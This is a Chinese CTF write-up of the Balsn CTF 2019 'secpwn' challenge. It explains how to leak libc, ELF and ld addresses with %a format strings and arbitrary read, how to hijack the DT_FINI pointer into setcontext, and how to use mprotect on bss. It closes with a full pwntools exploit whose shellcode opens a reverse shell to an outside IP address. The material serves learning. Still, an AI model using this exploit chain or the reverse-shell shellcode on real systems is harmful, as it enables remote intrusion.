# secpwn

环境是`Ubuntu19.04 libc2.29`,

原先是在`ubuntu18`下做的，但是没符号表实在是难受，于是乎直接捣鼓了一台`ubuntu19`的虚拟机，体验极好 :）

膜Ex师傅

以下全是看了Ex师傅博客之后做的
```shell
ruan@ruan:/mnt/hgfs/shared/balsnctf/pwn/secpwn$ ./secpwn
+-------------------------------+
| Secure Classic Pwn Playground |
+-------------------------------+
1. Secure bss overflow
2. Secure stack overflow
3. Secure heap overflow
4. Secure UAF
5. Secure format string
6. Secure read
7. Secure write
8. Secure GOT hijacking
9. Secure shellcode
10. exit
>

```

虽然题目保护全开，但这么多的漏洞，看着样子好像很**~~美好~~**的样子，而现实是

当时做题目的时候看着漏洞就是不会，而且程序每次都会

```c
 while ( 1 )
  {
    menu();
    v4 = get_int();
    if ( v4 <= 0xA )
      break;
    puts("Oops");
    v3 = v5++;
    close(5 - (v3 - 6 * (((unsigned __int128)(0x2AAAAAAAAAAAAAABLL * (signed __int128)v3) >> 64) - (v3 >> 63))));// close(5-v3%6)
                                                // so we have 6 chance
  }
```

退出时

```c
.text:0000000000001950                 lea     rdi, aBye       ; "bye~"
.text:0000000000001957                 call    _puts
.text:000000000000195C                 mov     edi, 0          ; fd
.text:0000000000001961                 call    _close
.text:0000000000001966                 mov     edi, 1          ; fd
.text:000000000000196B                 call    _close
.text:0000000000001970                 mov     edi, 2          ; fd
.text:0000000000001975                 call    _close
.text:000000000000197A                 mov     eax, 1337h
.text:000000000000197F                 mov     rsi, [rbp+var_8]
.text:0000000000001983                 xor     rsi, fs:28h
.text:000000000000198C                 jz      short locret_19F1
.text:000000000000198E                 jmp     short loc_19EC
```

那能想到的是应该要反弹`shell`了

首先是format_string函数这里，后面加了一大堆的参数，普通的`%x`,`%p`肯定不行了

但是这里可以`%a`泄露，orz

原先还做过`BCTF2018` 的`hardcore_fmt`,转头忘光光

```c
unsigned __int64 format_string()
{
  __int64 v1; // [rsp+2Ch] [rbp-20h]
  __int64 v2; // [rsp+34h] [rbp-18h]
  unsigned __int64 v3; // [rsp+44h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v1 = 0LL;
  v2 = 0LL;
  puts("fmt:");
  __read_chk(0LL, (__int64)&v1, 0xALL, 10LL);
  __printf_chk(
    1LL,
    &v1,
    0xDEADBEEFDEADBEEFLL,
    0xFACEB00CFACEB00CLL,
    0xFEE1DEADFEE1DEADLL,
    0xC0FFEEC0FFEELL,
    0x6666666666666666LL,
    0xDEADBEEFDEADBEEFLL,
    0xDEADBEEFDEADBEEFLL,
    0xDEADBEEFDEADBEEFLL,
    0xDEADBEEFDEADBEEFLL,
    0xDEADBEEFDEADBEEFLL);
  return __readfsqword(0x28u) ^ v3;
}

```
输入5个`%a`后可以泄露出 `libc`和`elf`的基址

```shell
	b'10. exit\n'
	b'>\n'
[DEBUG] Sent 0x2 bytes:
    b'5\n'
[DEBUG] Received 0x5 bytes:
    b'fmt:\n'
[DEBUG] Sent 0xa bytes:
    b'%a%a%a%a%a'
[DEBUG] Received 0x73 bytes:
    b'0x0.0000000000d68p-10220x0.07fb17d9e07e3p-10220x0.0000000000004p-10220x0.000000000000ap-10220x0.055884eb62019p-1022'
```
泄露完后现在可以用程序的`write`函数进行任意地址泄露

那泄露哪里呢，我原先想泄露栈地址，然后再靠着栈地址泄露出`canary`，这样程序的`stack_overflow`函数就**~~能用~~**了，结果是`canary`就有`\x00`截断，而程序的`stack_overflow`函数用的是`strcpy`

```c
unsigned __int64 __fastcall stack_overflow(char *a1)
{
  char src; // [rsp+10h] [rbp-110h]
  unsigned __int64 v3; // [rsp+118h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  memset(&src, 0, 0x100uLL);
  __read_chk(0LL, (__int64)&src, 255LL, 255LL);
  strcpy(a1, &src);
  memset(&src, 0, 0x100uLL);
  return __readfsqword(0x28u) ^ v3;
}
```

不过有了`elf`的基址，`bss_overflow`函数应该就能用上了

那泄露了，然后呢

看了Ex师傅的博客，`exit`的时候，（我太菜了，不知道咋弄出调试符号

```c
   0x7fb17da0ecf0:	mov    rax,QWORD PTR [r15+0xa8]
   0x7fb17da0ecf7:	test   rax,rax
   0x7fb17da0ecfa:	je     0x7fb17da0ed05
=> 0x7fb17da0ecfc:	mov    rax,QWORD PTR [rax+0x8]
   0x7fb17da0ed00:	add    rax,QWORD PTR [r15]
   0x7fb17da0ed03:	call   rax
```

这里对应的源码应该是`_dl_fini.c`里的

```c
    ((fini_t) array[i]) ();
			}

		      /* Next try the old-style destructor.  */
		      if (l->l_info[DT_FINI] != NULL)
			DL_CALL_DT_FINI
			  (l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
		    }

```

然后是我们可以看到`rax`由`[r15+0xa8]`得来，而`r15`

```c
 RBX  0x7fb17da29060 (_rtld_global) —▸ 0x7fb17da2a190 —▸ 0x55884eb60000 ◂— 0x10102464c457f
 RCX  0x0
 RDX  0x55884eb63d20 —▸ 0x55884eb61220 ◂— jmp    0x55884eb611a0
 RDI  0x55884eb64010 ◂— 0x1
 RSI  0x1
 R8   0x55884eb64008 ◂— 0x55884eb64008
 R9   0x0
 R10  0x7ffd9d89ac34 ◂— 0x1
 R11  0x2
 R12  0x0
 R13  0x7ffd9d89acf0 —▸ 0x7fb17da2a190 —▸ 0x55884eb60000 ◂— 0x10102464c457f
 R14  0x55884eb63d28 —▸ 0x55884eb611e0 ◂— cmp    byte ptr [rip + 0x2e29], 0
 R15  0x7fb17da2a190 —▸ 0x55884eb60000 ◂— 0x10102464c457f

```

所以我们向`0x7fb17da2a190+0xa8`的地址写入`bss`的地址，那调用`call rax`的时候我们就会有一次执行`gadget`的机会

所以我们要先泄露`ld`的位置，这里要说一下，好像本地的`ld`和`libc`的地址偏移是固定的，但是远程是不固定的，所以还是要用程序的`write`函数泄露一下

`libc`里的`libc.symbols['_rtld_global']`会有`ld`的地址

然后调用`call rax`的时候刚好`rdi`指向`bss`，配合`setcontext`和前面的`bss_overflow`就可以控制程序的流程了

一开始我我觉得后面都是`mov    rsp,QWORD PTR [rdx+0xa0]`,是从`rdx`这里读取的，好像不能用。

但是`setcontext`一开始有`push rdi`,然后又有`pop rdx`,这样的话`rdx = rdi`,简直`nice`，注意下绕过`fldenv[rcx]`,给个可读的地址就好了

```c
pwndbg> x/20i setcontext
   0x7fb17d850e00 <setcontext>:	push   rdi
   0x7fb17d850e01 <setcontext+1>:	lea    rsi,[rdi+0x128]
   0x7fb17d850e08 <setcontext+8>:	xor    edx,edx
   0x7fb17d850e0a <setcontext+10>:	mov    edi,0x2
   0x7fb17d850e0f <setcontext+15>:	mov    r10d,0x8
   0x7fb17d850e15 <setcontext+21>:	mov    eax,0xe
   0x7fb17d850e1a <setcontext+26>:	syscall 
   0x7fb17d850e1c <setcontext+28>:	pop    rdx
   0x7fb17d850e1d <setcontext+29>:	cmp    rax,0xfffffffffffff001
   0x7fb17d850e23 <setcontext+35>:	jae    0x7fb17d850e80 <setcontext+128>
   0x7fb17d850e25 <setcontext+37>:	mov    rcx,QWORD PTR [rdx+0xe0]
   0x7fb17d850e2c <setcontext+44>:	fldenv [rcx]
   0x7fb17d850e2e <setcontext+46>:	ldmxcsr DWORD PTR [rdx+0x1c0]
   0x7fb17d850e35 <setcontext+53>:	mov    rsp,QWORD PTR [rdx+0xa0]
   0x7fb17d850e3c <setcontext+60>:	mov    rbx,QWORD PTR [rdx+0x80]
   0x7fb17d850e43 <setcontext+67>:	mov    rbp,QWORD PTR [rdx+0x78]

```



那后面就没啥好说的了，劫持程序流程，先`mprotect`让`bss`可执行，最后跳转到`bss`用`shellcode`反弹`shell`出来



最终exp为：



```python
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil(">\n")
	p.sendline(str(command))

def main(host,port=2333):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./secpwn")
		gdb.attach(p,"b mprotect")
		# p = process("./secpwn_bak",env={"LD_PRELOAD":"./libc.so.6"})
		# debug(0x000000000001577)
	cmd(5)
	
	p.recvuntil("fmt:\n")
	p.send("%a"*5)
	p.recvuntil("0x0.0")
	p.recvuntil("0x0.0")
	libc.address = int(p.recvuntil('p',drop=True),16)-0x1e57e3
	p.recvuntil('p')
	p.recvuntil('p')
	p.recvuntil("0x0.0")
	elf.address = int(p.recvuntil('p',drop=True),16)-0x2019
	cmd(7)
	p.recvuntil("Addr: ")
	p.send(str(libc.symbols['_rtld_global']))
	ld = u64(p.recv(8))-0x2b060
	
	info("libc : " + hex(libc.address))
	info("elf : " + hex(elf.address))
	info("ld : " + hex(ld))
	# bss overflow
	# 0x7f4db5eede35 <setcontext+53>:	mov    rsp,QWORD PTR [rdx+0xa0]
	# 0x7f4db5eede3c <setcontext+60>:	mov    rbx,QWORD PTR [rdx+0x80]
	# 0x7f4db5eede43 <setcontext+67>:	mov    rbp,QWORD PTR [rdx+0x78]
	# 0x7f4db5eede47 <setcontext+71>:	mov    r12,QWORD PTR [rdx+0x48]
	# 0x7f4db5eede4b <setcontext+75>:	mov    r13,QWORD PTR [rdx+0x50]
	# 0x7f4db5eede4f <setcontext+79>:	mov    r14,QWORD PTR [rdx+0x58]
	# 0x7f4db5eede53 <setcontext+83>:	mov    r15,QWORD PTR [rdx+0x60]
	# 0x7f4db5eede57 <setcontext+87>:	mov    rcx,QWORD PTR [rdx+0xa8]
	# 0x7f4db5eede5e <setcontext+94>:	push   rcx
	# 0x7f4db5eede5f <setcontext+95>:	mov    rsi,QWORD PTR [rdx+0x70]
	# 0x7f4db5eede63 <setcontext+99>:	mov    rdi,QWORD PTR [rdx+0x68]
	# 0x7f4db5eede67 <setcontext+103>:	mov    rcx,QWORD PTR [rdx+0x98]
	# 0x7f4db5eede6e <setcontext+110>:	mov    r8,QWORD PTR [rdx+0x28]
	# 0x7f4db5eede72 <setcontext+114>:	mov    r9,QWORD PTR [rdx+0x30]
	# 0x7f4db5eede76 <setcontext+118>:	mov    rdx,QWORD PTR [rdx+0x88]
	# 0x7f4db5eede7d <setcontext+125>:	xor    eax,eax
	# 0x7f4db5eede7f <setcontext+127>:	ret
	cmd(1)
	offset = libc.symbols["setcontext"]-elf.address
	payload = p64(elf.address+0x4020)+p64(offset)
	payload = payload.ljust(0x58,b"\x00")
	payload += p64(elf.address+0x000000000004000)  #rdi
	payload += p64(0x1000)  #rsi
	payload += p64(elf.address+0x4400)	#rbp
	payload += p64(0) + p64(7)	# rbx , rdx
	payload = payload.ljust(0x88,b"\x00")
	payload += p64(elf.address+0x4020)
	payload += p64(elf.address+0x4100)	#rsp
	payload += p64(libc.symbols["mprotect"])
	payload = payload.ljust(0xd0,b"\x00")
	payload += p64(elf.address+0x4020)	#bypass fldenv [rcx]
	payload += p64(0)
	payload += p64(elf.address+0x4110)
	payload += b'\x90'*0x10
	
	reverse_shell = asm('''
		//socket(AF_INET,SOCK_STREAM,0)
		xor rdx,rdx
		xor rsi,rsi
		inc rsi
		xor rdi,rdi
		inc rdi
		inc rdi
		xor rax,rax
		mov al,41
		syscall
		//connect
		push rax
		pop rdi
		mov rcx,0x88e60f6a11270002
		push rcx
		mov rsi,rsp
		mov dl,0x10
		mov al,42
		syscall
		//dup2(fd,0)
		xor rsi,rsi
		mov al,33
		syscall
		//dup2(fd,1)
		inc rsi
		mov al,33
		syscall
		//execve("/bin/sh",0,0)
		mov rcx,0x68732f6e69622f
		push rcx
		mov rdi,rsp
		dec rsi
		xor rdx,rdx
		mov al,59
		syscall
	''')
	payload += reverse_shell
	p.sendline(payload)
	cmd(6)
	p.recvuntil("Addr: ")
	# fini array
	p.send(str(ld+0x2c190+0xa8))
	p.recvuntil("Data: ")
	# p.send(p64(elf.address+0x2f8)[:6])
	p.send(p64(elf.address+0x4020)[:6])
	cmd(10)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so.6",checksec=False)
	elf = ELF("./secpwn",checksec=False)
	main(args['REMOTE'])

```

参考链接：

[https://ex-origin.github.io/2019/10/08/Balsn-CTF-2019-PWN-writeup/#more](https://ex-origin.github.io/2019/10/08/Balsn-CTF-2019-PWN-writeup/#more)
